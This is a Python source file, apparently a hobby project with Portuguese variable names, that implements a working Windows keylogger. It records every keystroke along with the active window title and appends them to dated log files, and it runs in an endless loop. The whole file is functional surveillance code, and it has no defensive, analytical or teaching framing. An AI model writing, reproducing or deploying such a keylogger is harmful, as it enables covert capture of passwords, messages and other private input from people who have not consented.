from pynput import keyboard
import datetime
import os
import win32gui

try:
    os.mkdir('./Logs')
except:
    pass
class KeyLogger():
    timeStamp = str(datetime.date.today()).replace('-','')
    def __init__(self, NomeDoArquivo: str = './Logs/'+timeStamp+'.txt') -> None:
        self.NomeDoArquivo = NomeDoArquivo
        self.j2 = ''

    @staticmethod
    def get_char(Tecla):
        try:
            return Tecla.char
        except AttributeError:
            if str(Tecla) == 'Key.space':
                Tecla = str(Tecla).replace('Key.space',' ')
            if str(Tecla) == 'Key.enter':
                Tecla = str(Tecla).replace('Key.enter','\n')
            return str(Tecla)

    def on_press(self, Tecla):
        with open(self.NomeDoArquivo, 'a') as logs:
            logs.write(self.get_win_name())
            logs.write(self.get_char(Tecla))
            
    def get_win_name(self):
        janela=win32gui
        self.j1 = janela.GetWindowText(janela.GetForegroundWindow())
        if self.j1 != self.j2:
            self.j2 = self.j1
            return '\n+- '+self.j2+' -+\n'
        else:
            return ''

    def main(self):
        escuta = keyboard.Listener(
            on_press=self.on_press,
        )
        escuta.start()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    looper = 0
    while looper == 0:
        pass